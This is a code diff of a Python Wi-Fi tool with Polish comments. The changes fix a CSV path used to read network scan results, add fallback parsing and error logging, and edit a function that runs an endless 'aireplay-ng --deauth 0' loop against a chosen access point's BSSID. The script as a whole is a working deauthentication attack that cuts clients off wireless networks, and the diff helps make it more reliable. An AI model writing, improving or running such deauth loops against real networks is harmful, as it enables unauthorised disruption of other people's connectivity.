@@ -154,7 +154,7 @@ def scan_networks(interface: str, duration: int = 10) -> List[Dict[str, str]]:
         
         # Odczytaj wyniki
         if os.path.exists("/tmp/scan-01.csv"):
-            with open("/tmp-01.csv", "r", encoding='utf-8', errors='ignore') as f:
+            with open("/tmp/scan-01.csv", "r", encoding='utf-8', errors='ignore') as f:
                 content = f.read()
                 
             # Parsuj CSV
@@ -236,7 +236,17 @@ def scan_networks(interface: str, duration: int = 10) -> List[Dict[str, str]]:
                     
                     elif 'SSID:' in line:
                         current_essid = line.split(':', 1)[1].strip()
-                        
+                
+                # Dodaj ostatnią sieć
+                if current_bssid and current_essid and current_channel:
+                    networks.append({
+                        'bssid': current_bssid,
+                        'channel': current_channel,
+                        'essid': current_essid
+                    })
+        except Exception as e2:
+            logging.error(f"Fallback scan also failed: {e2}")
+    
     return networks
 
 
@@ -334,7 +344,6 @@ def run_deauth_loop(interface: str, channel: str, bssid: str) -> None:
                 logging.info(f"Running deauth to {bssid}")
                 
                 # Uruchom aireplay-ng z --deauth 0 (niekończące się)
-                # Używamy Popen zamiast run żeby móc przechwycić Ctrl+C
                 cmd = ["aireplay-ng", "--deauth", "0", "-a", bssid, interface]
                 
                 with subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, 
